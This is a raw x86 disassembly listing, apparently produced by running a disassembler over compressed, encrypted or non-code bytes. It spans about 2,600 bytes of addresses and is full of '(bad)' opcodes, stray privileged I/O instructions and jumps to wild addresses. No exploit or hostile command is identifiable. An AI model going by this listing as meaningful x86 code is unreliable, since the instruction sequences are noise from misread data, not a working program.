  4181bc:	retf   0x862d
  4181bf:	mov    dh,0xae
  4181c1:	cmp    esp,ecx
  4181c3:	ins    BYTE PTR es:[edi],dx
  4181c4:	test   BYTE PTR [esi+0x5],0xc8
  4181c8:	jl     0x4181df
  4181ca:	ret    0x68f2
  4181cd:	mov    ah,0x7d
  4181cf:	cmp    DWORD PTR [ecx+ecx*8],edi
  4181d2:	jge    0x41815d
  4181d4:	mov    bh,0x30
  4181d6:	sbb    esp,esi
  4181d8:	xor    BYTE PTR [eax],ch
  4181da:	cmp    DWORD PTR ds:0xf1d5e1fe,0xffffffff
  4181e1:	xor    BYTE PTR [edx+0x6305e21d],dh
  4181e7:	push   ds
  4181e8:	test   al,0xa
  4181ea:	ret    0x131b
  4181ed:	div    DWORD PTR [edx+0x5e869cb1]
  4181f3:	ds pop ss
  4181f5:	data16 cmp al,0xa2
  4181f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181f9:	adc    BYTE PTR [eax+0x6da3f681],cl
  4181ff:	adc    BYTE PTR [eax-0x6c89c977],ah
  418205:	and    eax,0xf289896d
  41820a:	jg     0x4181aa
  41820c:	inc    ebp
  41820d:	xor    al,0xce
  41820f:	fwait
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xc21db8d6
  418282:	fdivr  DWORD PTR [ecx]
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	cmp    DWORD PTR [ecx+0x60],ebp
  41828f:	add    eax,0x54033847
  418294:	test   eax,0x6f31005e
  418299:	loopne 0x4182f2
  41829b:	xor    ch,ch
  41829d:	ficom  DWORD PTR [ebx]
  41829f:	loop   0x4182a2
  4182a1:	pop    edx
  4182a2:	in     eax,0xc0
  4182a4:	mov    ah,0xdd
  4182a6:	xor    DWORD PTR [esi-0x48d75e4e],esi
  4182ac:	push   0x56
  4182ae:	xchg   edx,eax
  4182af:	cmp    al,0xb3
  4182b1:	cld    
  4182b2:	enter  0x9b24,0xd
  4182b6:	stos   BYTE PTR es:[edi],al
  4182b7:	mov    al,0x27
  4182b9:	cwde   
  4182ba:	inc    ebx
  4182bb:	lds    eax,FWORD PTR [ebx+eiz*2]
  4182be:	cwde   
  4182bf:	pop    eax
  4182c0:	mov    eax,0x980494e0
  4182c5:	mov    esi,0xb51e7e43
  4182ca:	push   es
  4182cb:	sbb    esp,DWORD PTR [edi-0x4cdafe4c]
  4182d1:	jno    0x4182ba
  4182d3:	or     dh,dl
  4182d5:	stos   BYTE PTR es:[edi],al
  4182d6:	mov    ds:0x53890595,eax
  4182db:	pop    esp
  4182dc:	jns    0x418276
  4182de:	shl    DWORD PTR [ebp+0x1e8cb218],0x8c
  4182e5:	add    ch,bh
  4182e7:	and    ch,BYTE PTR [edx]
  4182e9:	push   ecx
  4182ea:	mov    bh,0x99
  4182ec:	test   al,0x7d
  4182ef:	loopne 0x418314
  4182f1:	imul   edx,ebx,0xffffff88
  4182f4:	xchg   eax,ecx
  4182f6:	jp     0x41828c
  4182f8:	je     0x4182b2
  4182fa:	dec    edi
  4182fb:	shl    BYTE PTR [ecx+0x7b1e4c85],cl
  418301:	gs stos DWORD PTR es:[edi],eax
  418303:	or     bh,BYTE PTR [ecx+edi*8]
  418306:	fnsave [ebx-0x3a365ec3]
  41830c:	adc    eax,0x422d420c
  418311:	mov    eax,0xf4b1d7a5
  418316:	fisub  DWORD PTR [edi]
  418318:	mov    al,0xb7
  41831a:	or     bh,BYTE PTR [edx]
  41831c:	push   ebx
  41831d:	pop    eax
  41831e:	xchg   BYTE PTR [edi],ch
  418320:	loopne 0x418341
  418322:	in     al,0xd9
  418324:	in     eax,dx
  418325:	scas   al,BYTE PTR es:[edi]
  418326:	pop    edi
  418327:	ja     0x418332
  418329:	push   esp
  41832a:	and    eax,0x5a19599
  41832f:	lea    ebp,[edi]
  418331:	ss retf 
  418333:	add    al,0x13
  418335:	retf   0xd4d3
  418338:	out    0x9c,eax
  41833a:	inc    eax
  41833b:	jmp    0x8001ed82
  418340:	and    eax,0xb86809c4
  418345:	(bad)  
  418346:	inc    edi
  418347:	repnz sub BYTE PTR [ebx],dh
  41834a:	jno    0x41836c
  41834c:	(bad)  
  41834e:	sub    dl,ah
  418350:	mov    eax,0x786b638a
  418355:	push   esi
  418356:	dec    eax
  418357:	push   ebx
  418358:	jne    0x4183ca
  41835a:	add    al,0x9e
  41835c:	mov    edx,0xb1eca3e6
  418361:	pusha  
  418362:	lods   al,BYTE PTR ds:[esi]
  418363:	mov    edx,ebp
  418365:	ja     0x418386
  418367:	or     al,0xbd
  418369:	cmp    al,ah
  41836b:	lock pop ebp
  41836d:	fwait
  41836e:	push   esp
  41836f:	sahf   
  418370:	inc    edi
  418371:	xchg   ebp,eax
  418372:	jbe    0x418328
  418374:	es inc esp
  418376:	jnp    0x418347
  418378:	call   DWORD PTR [ebx+0x56af7da1]
  41837e:	cmc    
  41837f:	xor    bh,BYTE PTR [eax]
  418381:	mov    edi,ebx
  418383:	loop   0x41836f
  418385:	mov    ds:0xb6874d4,al
  41838a:	jo     0x418368
  41838c:	nop
  41838d:	xchg   edi,eax
  41838e:	jmp    0x418334
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	(bad)  
  418401:	shl    BYTE PTR [edx],cl
  418403:	xor    al,0x94
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	les    eax,FWORD PTR [edx]
  41840e:	mov    al,ds:0x17f65215
  418413:	or     BYTE PTR [bx],ch
  418416:	or     DWORD PTR [ebx],eax
  418418:	das    
  418419:	test   DWORD PTR [ebx-0x31fee00a],0x746251e2
  418423:	mov    bh,BYTE PTR [edx-0xd929f29]
  418429:	jge    0x418465
  41842b:	mov    ds:0x16888ad4,al
  418430:	push   edx
  418431:	inc    ebx
  418432:	in     al,0xd2
  418434:	ja     0x418462
  418436:	xor    al,0x96
  418438:	scas   eax,DWORD PTR es:[edi]
  418439:	ror    BYTE PTR [esi+0x10],1
  41843c:	jle    0x418482
  41843e:	mov    bl,0x7a
  418440:	dec    esi
  418441:	jmp    0x418454
  418443:	leave  
  418444:	adc    al,0x9c
  418446:	ins    BYTE PTR es:[edi],dx
  418447:	clc    
  418448:	pop    ebp
  418449:	or     esi,edi
  41844b:	mov    WORD PTR [ebx+0x4a95c1d2],cs
  418451:	xor    al,0x94
  418453:	(bad)  
  418454:	fnstcw WORD PTR [edi+0x54]
  418457:	int3   
  418458:	sub    bl,BYTE PTR [eax]
  41845a:	(bad)  [edi]
  41845c:	(bad)  [ecx+0x7e]
  41845f:	add    DWORD PTR [edi-0x69],edi
  418462:	mov    bl,0x94
  418464:	repz dec eax
  418466:	fimul  WORD PTR [ecx+ebp*8]
  418469:	scas   eax,DWORD PTR es:[edi]
  41846a:	or     al,0x4a
  41846c:	fmul   DWORD PTR [esi+ebp*1+0x54]
  418470:	hlt    
  418471:	adc    esp,DWORD PTR [ecx-0x1b]
  418474:	cmp    al,BYTE PTR [ecx]
  418476:	push   ss
  418477:	sbb    eax,0xd5aec682
  41847c:	bound  eax,QWORD PTR [edi+0x603ace46]
  418482:	mov    esp,0x173b777a
  418487:	push   ds
  418488:	pop    edi
  418489:	outs   dx,BYTE PTR ds:[esi]
  41848a:	cmp    BYTE PTR [eax],bh
  41848c:	loop   0x4184de
  41848e:	cld    
  41848f:	add    eax,0x7470eb06
  418494:	inc    ebx
  418495:	addr16 clc 
  418497:	imul   eax,DWORD PTR [edi],0x3a9b2f9a
  41849d:	mov    dh,0x32
  41849f:	pop    es
  4184a0:	pop    ds
  4184a1:	jnp    0x418479
  4184a3:	mov    eax,0xd906d6fc
  4184a8:	cdq    
  4184a9:	std    
  4184aa:	mov    esi,ds
  4184ac:	xlat   BYTE PTR ds:[ebx]
  4184ad:	xor    eax,0xe1328b54
  4184b2:	cmp    al,0x30
  4184b4:	jecxz  0x41846d
  4184b6:	pop    ebp
  4184b7:	xor    eax,DWORD PTR [eax]
  4184b9:	cmp    ebx,ebx
  4184bb:	mov    dl,BYTE PTR [ebx+esi*1]
  4184be:	stos   DWORD PTR es:[edi],eax
  4184bf:	mov    eax,0xc3656b65
  4184c4:	in     al,0x95
  4184c6:	repz add al,0xdb
  4184c9:	cmp    DWORD PTR [ecx+0x1f],0xffffffda
  4184cd:	inc    esi
  4184ce:	xchg   DWORD PTR [esi+0x2ad0f8a],edx
  4184d4:	mov    ds:0x4b6cdf38,al
  4184d9:	jno    0x418500
  4184db:	pop    ds
  4184dc:	outs   dx,DWORD PTR ds:[esi]
  4184dd:	inc    ebx
  4184de:	push   esi
  4184df:	arpl   cx,dx
  4184e1:	ds rcl ch,0x29
  4184e5:	and    edi,esi
  4184e7:	or     al,0xe7
  4184e9:	xchg   ecx,eax
  4184ea:	xchg   ebp,eax
  4184eb:	fisttp DWORD PTR [ebx+0x62]
  4184ee:	jmp    0x358728fa
  4184f3:	lahf   
  4184f4:	xchg   ecx,eax
  4184f5:	adc    DWORD PTR [eax-0x534d0e9b],0x4c27699
  4184ff:	mov    bl,0x2b
  418501:	out    dx,al
  418502:	or     BYTE PTR [edx],ch
  418504:	xor    ch,BYTE PTR [bp+si]
  418507:	nop
  418508:	pop    ss
  418509:	(bad)  
  41850a:	cmp    eax,0x33df54b6
  41850f:	and    al,BYTE PTR [eax]
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	jg     0x4185fa
  418582:	mov    db3,eax
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	mov    WORD PTR [ecx+edi*1-0x61],fs
  418590:	scas   al,BYTE PTR es:[edi]
  418591:	cli    
  418592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418593:	xchg   edx,esp
  418595:	(bad)  
  418596:	jle    0x418533
  418598:	mov    ds:0x4c74804a,al
  41859d:	in     eax,dx
  41859e:	fadd   QWORD PTR [ecx-0x6d]
  4185a1:	or     eax,0xaca070a3
  4185a6:	rcl    DWORD PTR [edx+eax*2-0xad47f92],cl
  4185ad:	push   esi
  4185ae:	add    bh,cl
  4185b0:	inc    eax
  4185b1:	or     al,0xac
  4185b3:	std    
  4185b4:	retf   
  4185b5:	adc    eax,0xf2453370
  4185ba:	stc    
  4185bb:	fnstenv [esi-0x35]
  4185be:	sti    
  4185bf:	xor    BYTE PTR [ebx+0x15],ch
  4185c2:	test   eax,0xe4555aed
  4185c7:	adc    cl,cl
  4185c9:	popa   
  4185ca:	inc    ebx
  4185cb:	clc    
  4185cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185cd:	inc    ebp
  4185ce:	mov    bl,0x92
  4185d0:	jnp    0x418593
  4185d2:	pop    ecx
  4185d3:	add    BYTE PTR [edi-0x69698f8c],cl
  4185d9:	clc    
  4185da:	cwde   
  4185db:	test   BYTE PTR [edi+0x34812b83],ah
  4185e1:	mov    edi,0xa09cccd4
  4185e6:	cdq    
  4185e7:	in     al,dx
  4185e8:	jnp    0x4185e7
  4185ea:	mov    ecx,0x65e473b7
  4185ef:	(bad)  
  4185f0:	repnz scas eax,DWORD PTR es:[edi]
  4185f2:	and    al,0xf8
  4185f4:	mov    edi,0xe9434c7d
  4185f9:	push   esi
  4185fa:	ins    BYTE PTR es:[edi],dx
  4185fb:	push   edx
  4185fc:	xor    DWORD PTR [ecx],ecx
  4185fe:	test   DWORD PTR [esi+esi*2],0x623b6ef4
  418605:	fwait
  418606:	js     0x418613
  418608:	or     dh,0xde
  41860b:	mov    bl,0x38
  41860d:	adc    eax,DWORD PTR [eax]
  41860f:	sub    al,0x86
  418611:	and    ebx,eax
  418613:	xchg   edx,eax
  418614:	outs   dx,BYTE PTR ds:[esi]
  418615:	imul   ebx,DWORD PTR [ebp-0x388bc85],0x25ed6d63
  41861f:	pop    ds
  418620:	leave  
  418621:	fwait
  418622:	test   al,0x91
  418624:	pop    ebp
  418625:	pop    ebx
  418626:	and    eax,DWORD PTR [eax+0x33f79bda]
  41862c:	(bad)  
  41862d:	or     BYTE PTR [ecx+0xf],dl
  418630:	cld    
  418631:	jb     0x418602
  418633:	pop    es
  418634:	dec    esp
  418635:	mov    ebp,0x9a70e95e
  41863a:	clc    
  41863b:	iret   
  41863c:	push   esp
  41863d:	dec    edx
  41863e:	pop    es
  41863f:	xchg   DWORD PTR [ebx],esi
  418641:	mov    edi,0x3cc7b70
  418646:	int    0x65
  418648:	enter  0x9f2b,0x7f
  41864c:	xchg   ebx,eax
  41864d:	xchg   edi,eax
  41864e:	arpl   WORD PTR [edi+0x51],si
  418651:	out    0xd9,al
  418653:	test   eax,0x2453adf6
  418658:	cmp    eax,0xf6e24d21
  41865d:	popa   
  41865e:	popa   
  41865f:	pop    edx
  418660:	sbb    al,0x29
  418662:	(bad)
  418665:	add    ah,BYTE PTR [eax]
  418667:	mov    ebx,0x8c1ca197
  41866c:	sar    al,0x57
  41866f:	add    ecx,DWORD PTR [ecx-0x7b700e8d]
  418675:	and    bl,dl
  418677:	sub    eax,0x8707ae63
  41867c:	popa   
  41867d:	sbb    ecx,edi
  41867f:	loope  0x418633
  418681:	cld    
  418682:	or     al,0x96
  418684:	daa    
  418685:	jbe    0x418642
  418687:	in     al,dx
  418688:	sbb    esi,DWORD PTR [ebp+edx*2-0x2053613a]
  41868f:	cmc    
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	xchg   DWORD PTR [esi+0x29caa5c],ecx
  418706:	add    DWORD PTR [eax],eax
  418708:	add    al,0x1
  41870a:	add    BYTE PTR [eax],al
  41870c:	jo     0x418740
  41870e:	mov    dh,BYTE PTR [ecx-0x6c3cf51b]
  418714:	jmp    0x50396ab3
  418719:	cmp    eax,DWORD PTR ds:0x31a99bc
  41871f:	inc    ebx
  418720:	pop    edi
  418721:	push   cs
  418722:	nop
  418723:	and    eax,esp
  418725:	in     al,0x4a
  418727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418728:	enter  0x91bf,0x38
  41872c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41872d:	xchg   edi,eax
  41872e:	sbb    eax,eax
  418730:	xor    bh,BYTE PTR [ebp+eiz*1-0x18a9b103]
  418737:	pop    es
  418738:	int3   
  418739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41873a:	shl    BYTE PTR [edi],0xdc
  41873d:	mov    dl,0x4a
  41873f:	(bad)  
  418740:	xor    BYTE PTR [ebx],cl
  418742:	popa   
  418743:	push   edi
  418744:	or     al,0xf6
  418746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418747:	mov    ebp,0xa52f3789
  41874c:	test   eax,0xbeb6f2a9
  418751:	popf   
  418752:	fistp  WORD PTR [ecx-0x37]
  418755:	jns    0x418766
  418757:	push   cs
  418758:	jp     0x4186e7
  41875a:	ficomp WORD PTR [esi+0x24111cc1]
  418760:	or     cl,BYTE PTR [ebx+esi*4-0x3c]
  418764:	xchg   ebp,eax
  418765:	dec    ecx
  418766:	inc    eax
  418767:	sahf   
  418768:	test   DWORD PTR [edx-0x2386482],0x1897adf1
  418772:	iret   
  418773:	cmp    BYTE PTR ds:[edi-0xc],al
  418777:	fcom   QWORD PTR [ebx+0x64]
  41877a:	jo     0x41876f
  41877c:	pushf  
  41877d:	imul   edi,DWORD PTR [ebp+ebp*2+0x3470f5b4],0x33cfab13
  418788:	retf   0x12e2
  41878b:	xchg   esp,eax
  41878c:	test   bh,0xb9
  41878f:	cmp    BYTE PTR [esi-0x45f6c5d0],bl
  418795:	(bad)  
  418796:	addr16 inc esp
  418798:	in     al,0xd
  41879a:	loop   0x418800
  41879c:	mov    DWORD PTR [esi+esi*4+0x1764e89c],edi
  4187a3:	adc    eax,0x23910524
  4187a8:	mov    esp,0xe2eac9a4
  4187ad:	push   edi
  4187ae:	sahf   
  4187af:	pop    es
  4187b0:	fld    QWORD PTR [eax+0x1fd8d801]
  4187b6:	fwait
  4187b7:	out    dx,al
  4187b8:	fnstsw WORD PTR [esi]
  4187ba:	or     esi,eax
  4187bc:	jbe    0x418753
  4187be:	dec    edx
  4187bf:	add    ah,ah
  4187c1:	sub    eax,0xe7256961
  4187c6:	adc    eax,0x2f62b347
  4187cb:	inc    eax
  4187cc:	js     0x4187e9
  4187ce:	and    DWORD PTR [ecx-0x2c1af482],esi
  4187d4:	aam    0x7e
  4187d6:	push   eax
  4187d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187d8:	xchg   esp,eax
  4187d9:	(bad)  
  4187da:	outs   dx,BYTE PTR ds:[esi]
  4187db:	fld    TBYTE PTR [edx]
  4187dd:	cmc    
  4187de:	push   ebp
  4187df:	loopne 0x41876d
  4187e1:	repnz sbb eax,0xada96b9
  4187e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e8:	push   DWORD PTR ds:0x39491cdb
  4187ee:	sahf   
  4187ef:	lea    ebx,[eax+0xe]
  4187f2:	mov    esp,0x7088de
  4187f7:	dec    ecx
  4187f8:	mov    ch,0xbb
  4187fa:	stc    
  4187fb:	jns    0x4187f1
  4187fd:	repz jg 0x418780
  418800:	sbb    BYTE PTR [edi],al
  418802:	test   al,0x5e
  418804:	dec    edx
  418805:	(bad)  
  418806:	mov    eax,ds:0x823b799b
  41880b:	or     DWORD PTR [ebx],esp
  41880d:	jmp    0x41f2a2
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x729c3acd]
  418881:	aas    
  418882:	stos   DWORD PTR es:[edi],eax
  418883:	call   0x428c28
  418888:	add    al,0x1
  41888a:	add    BYTE PTR [eax],al
  41888c:	sub    eax,0x23c706eb
  418891:	mov    dh,BYTE PTR [ecx-0x49]
  418894:	xor    al,BYTE PTR [ebx+0x76]
  418897:	pushf  
  418898:	bnd call 0x533f060c
  41889e:	cmp    ch,BYTE PTR [edx+0x2dfca775]
  4188a4:	call   0xabe9b59c
  4188a9:	pop    ecx
  4188aa:	clc    
  4188ab:	imul   edx,DWORD PTR [edx-0x7],0x2d9725a1
  4188b2:	and    cl,ah
  4188b4:	loopne 0x41891a
  4188b6:	push   ecx
  4188b7:	push   ss
  4188b8:	and    BYTE PTR [ebx-0x70],ch
  4188bb:	jge    0x418874
  4188bd:	pusha  
  4188be:	or     dl,BYTE PTR [ecx+0x32b50bac]
  4188c4:	xchg   BYTE PTR [ebp-0x17ca6ceb],dh
  4188ca:	pop    esp
  4188cb:	aas    
  4188cc:	es fwait
  4188ce:	sub    al,0x3b
  4188d0:	pusha  
  4188d1:	mov    al,0xe2
  4188d3:	sbb    DWORD PTR [ecx+0x4587f4d7],ebx
  4188d9:	push   es
  4188da:	adc    al,0x4e
  4188dc:	jle    0x418886
  4188de:	fdivr  QWORD PTR [ebp-0x2f1204b9]
  4188e4:	push   esp
  4188e5:	int3   
  4188e6:	adc    dh,BYTE PTR [ebx+0x1]
  4188e9:	adc    dl,BYTE PTR [ebp+0xf]
  4188ec:	(bad)  
  4188ee:	pop    esp
  4188ef:	jno    0x418922
  4188f1:	retf   
  4188f2:	mov    bl,0x65
  4188f4:	jnp    0x41894f
  4188f6:	(bad)  
  4188f7:	popf   
  4188f8:	mov    ebx,0xdfb1e694
  4188fd:	or     DWORD PTR [esi],ebp
  4188ff:	mov    cl,0x88
  418901:	or     DWORD PTR [edi],ebx
  418903:	lea    edx,[edx+0x0]
  418906:	push   ebx
  418907:	dec    ebx
  418908:	jno    0x4188f9
  41890a:	ror    BYTE PTR [edi+0x2d7e834d],cl
  418910:	mov    dh,0xfe
  418912:	out    0xf3,al
  418914:	rcl    BYTE PTR [eax-0x7b],1
  418917:	lahf   
  418918:	clc    
  418919:	xlat   BYTE PTR ds:[ebx]
  41891a:	lods   eax,DWORD PTR ds:[esi]
  41891b:	int    0x87
  41891d:	mov    eax,0x6518a276
  418922:	cmp    edi,DWORD PTR [edi-0x1bc7e878]
  418928:	mov    eax,0xb6345978
  41892d:	dec    esp
  41892e:	inc    esi
  41892f:	mov    ds:0x627e6ee1,al
  418934:	popa   
  418935:	pop    ebx
  418936:	loop   0x4188d0
  418938:	rcl    BYTE PTR [ecx-0x3b],0x8f
  41893c:	hlt    
  41893d:	xor    al,0xf8
  41893f:	xlat   BYTE PTR ds:[ebx]
  418940:	(bad)  
  418941:	ss push ecx
  418943:	mov    bh,0x57
  418945:	(bad)  
  418946:	ds icebp 
  418948:	inc    ecx
  418949:	mov    ebp,0x6a2e7c54
  41894e:	push   eax
  41894f:	push   ebp
  418950:	hlt    
  418951:	or     ch,ch
  418953:	adc    al,0x9c
  418955:	sbb    eax,0xf3631c16
  41895a:	sbb    eax,0xd3b5df0e
  41895f:	sub    al,0xfa
  418961:	stos   BYTE PTR es:[edi],al
  418962:	xor    edx,esi
  418964:	and    ebx,DWORD PTR [edi]
  418966:	fiadd  DWORD PTR [esi-0x27]
  418969:	sub    al,BYTE PTR [esi+0x6a48f9b6]
  41896f:	in     al,dx
  418970:	jbe    0x41892f
  418972:	and    ecx,DWORD PTR [esi-0x18d39625]
  418978:	dec    ebx
  418979:	push   ax
  41897b:	pop    ebx
  41897c:	ins    DWORD PTR es:[edi],dx
  41897d:	push   esi
  41897e:	lock popa 
  418980:	rcr    BYTE PTR [ebx],0xcd
  418983:	cmovle edx,DWORD PTR [eax+0x0]
  418987:	int    0x18
  418989:	or     ecx,esp
  41898b:	xor    eax,0xd6678fc
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xc24f7e69
  418a03:	inc    edi
  418a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	cmc    
  418a0d:	out    dx,eax
  418a0e:	outs   dx,BYTE PTR ds:[esi]
  418a0f:	ds pop edx
  418a11:	and    BYTE PTR [ebp+ebx*8-0x3b],cl
  418a15:	popa   
  418a16:	iret   
  418a17:	sar    BYTE PTR [ecx-0x76],0x78
  418a1b:	es scas eax,DWORD PTR es:[edi]
  418a1d:	iret   
  418a1e:	jge    0x4189b2
  418a20:	jne    0x418a14
  418a22:	sti    
  418a23:	test   BYTE PTR [ebp+0x19],cl
  418a26:	pusha  
  418a27:	mov    bl,0x3e
  418a29:	std    
  418a2a:	sahf   
  418a2b:	dec    edx
  418a2c:	push   ebp
  418a2d:	mov    al,ds:0x39ac0e0e
  418a32:	jb     0x4189f3
  418a34:	pop    ds
  418a35:	dec    eax
  418a36:	out    0x30,al
  418a38:	jnp    0x4189ed
  418a3a:	xchg   ebp,eax
  418a3b:	cmp    BYTE PTR [ecx],0x53
  418a3e:	add    eax,0xaf64ce0b
  418a43:	inc    ebp
  418a44:	arpl   WORD PTR [eax-0x15],sp
  418a47:	dec    esi
  418a48:	mov    BYTE PTR cs:0xd64d7a5d,dl
  418a4f:	cmp    edi,ebx
  418a51:	mov    ch,0xfd
  418a53:	inc    ebp
  418a54:	test   eax,0x54bf666b
  418a59:	and    BYTE PTR [esi-0x2c],ch
  418a5c:	fist   WORD PTR ds:[ebx-0x79]
  418a60:	fisttp WORD PTR [edi+edi*4+0x61ac2678]
  418a67:	ror    BYTE PTR [edi+0x14ef79fd],cl
  418a6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a6e:	jbe    0x418add
  418a70:	lea    ebp,[ecx-0x266c11e9]
  418a76:	call   0xae80:0x9aab8356
  418a7d:	aaa    
  418a7e:	loope  0x418a58
  418a80:	mov    esi,0x13a638ca
  418a85:	cli    
  418a86:	pop    eax
  418a87:	repz retf 0x6ec2
  418a8b:	inc    eax
  418a8d:	dec    edi
  418a8e:	mov    ds:0xd447762a,eax
  418a93:	pop    ebp
  418a94:	or     DWORD PTR [ebp+0x59],0xffffff98
  418a98:	and    al,0x11
  418a9a:	retf   0xf7cf
  418a9d:	arpl   WORD PTR [esi+0x6bfed830],di
  418aa3:	mov    eax,ds:0x334f55c0
  418aa8:	dec    esp
  418aa9:	dec    ebp
  418aaa:	adc    cl,BYTE PTR [edi+0x22]
  418aad:	idiv   edx
  418aaf:	fwait
  418ab0:	stos   DWORD PTR es:[edi],eax
  418ab1:	sbb    DWORD PTR [edi+0x4d],ecx
  418ab4:	push   es
  418ab5:	leave  
  418ab6:	adc    DWORD PTR [eax-0x3cf15902],0x80e2378f
  418ac0:	frstor ds:0x2da63b91
  418ac6:	sbb    al,0x68
  418ac8:	xor    eax,0x318a43e4
  418acd:	mov    ecx,0x4540a5fd
  418ad2:	inc    ecx
  418ad3:	jmp    0x418a70
  418ad5:	pop    edi
  418ad6:	pop    esp
  418ad7:	mov    edx,DWORD PTR ds:0xe7304da8
  418add:	pop    ebp
  418ade:	lods   eax,DWORD PTR ds:[esi]
  418adf:	lods   al,BYTE PTR ds:[esi]
  418ae0:	mov    al,0xfe
  418ae2:	es xor edi,eax
  418ae5:	xchg   BYTE PTR [eax+edx*2+0x64cc4cf2],ah
  418aec:	dec    ecx
  418aed:	inc    esi
  418aee:	or     bl,ch
  418af0:	mov    ds:0xeb9c8674,al
  418af5:	mov    ah,0xac
  418af7:	(bad)  [ebx]
  418af9:	mov    esi,0x3d7f0859
  418afe:	cld    
  418aff:	into   
  418b00:	(bad)  
  418b01:	fstp   TBYTE PTR ds:0xd028f9bb
  418b07:	inc    esi
  418b08:	pop    edi
  418b09:	or     al,0x45
  418b0b:	dec    edx
  418b0c:	cmp    eax,eax
  418b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b0f:	mov    ebp,0x0
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xe
  418b81:	dec    ecx
  418b82:	and    dh,BYTE PTR [edi-0x58]
  418b85:	add    eax,0x1040001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	sub    al,0x86
  418b8e:	popa   
  418b8f:	xor    edx,ebx
  418b91:	push   ebp
  418b92:	cs cwde 
  418b94:	cmp    cl,BYTE PTR [edx]
  418b96:	pop    eax
  418b97:	lods   eax,DWORD PTR ds:[esi]
  418b98:	mov    ds:0xd9b92749,al
  418b9d:	adc    edx,DWORD PTR [esi-0x1d]
  418ba0:	cmp    ch,BYTE PTR [ecx]
  418ba2:	sti    
  418ba3:	sbb    bl,BYTE PTR [edi]
  418ba5:	xlat   BYTE PTR ds:[ebx]
  418ba6:	mov    edx,0xbecbeb19
  418bab:	daa    
  418bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bad:	xchg   ebp,eax
  418bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418baf:	loope  0x418b7f
  418bb1:	sbb    DWORD PTR [eax-0x17],eax
  418bb4:	sbb    eax,0x1fd616c6
  418bb9:	pop    ss
  418bba:	mov    bl,0xab
  418bbc:	aam    0x21
  418bbe:	out    0x8b,eax
  418bc0:	mov    eax,0x6ae8d057
  418bc5:	jle    0x418b69
  418bc7:	sbb    BYTE PTR [esi],ah
  418bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bca:	jle    0x418b70
  418bcc:	hlt    
  418bcd:	jl     0x418c28
  418bcf:	xor    esp,edi
  418bd1:	cmp    eax,0x2843b425
  418bd6:	cdq    
  418bd7:	sub    edx,DWORD PTR [esi]
  418bd9:	cdq    
  418bda:	mov    ebx,0x69d21b96
  418bdf:	out    dx,eax
  418be0:	(bad)  
  418be1:	xor    eax,0x7bc4dfd8
  418be6:	sub    dh,BYTE PTR [edx]
  418be8:	or     edx,DWORD PTR [ebx-0x795a7f2f]
  418bee:	lock xor bh,BYTE PTR [edx-0x73f9e063]
  418bf5:	pop    eax
  418bf6:	daa    
  418bf7:	sub    DWORD PTR [edx+0x41],esp
  418bfa:	sub    eax,0x21686b21
  418bff:	shl    DWORD PTR [eax-0x2a006250],cl
  418c05:	int    0xd1
  418c07:	stos   DWORD PTR es:[edi],eax
  418c08:	jg     0x418bde
  418c0a:	fdivr  DWORD PTR [esi-0x315cbfdd]
  418c10:	inc    ecx
  418c11:	or     cl,BYTE PTR [ebx+0x1e]
  418c14:	mov    ecx,0x87ed6c0a
  418c19:	inc    ebx
  418c1a:	xor    cl,bh
  418c1c:	mov    esp,0xd99053ff
  418c21:	adc    dl,BYTE PTR es:[edi+ecx*1+0x27e3b76f]
  418c29:	push   edi
  418c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c2b:	(bad)  
  418c2c:	dec    BYTE PTR [esi+0x59]
  418c2f:	out    0x6a,eax
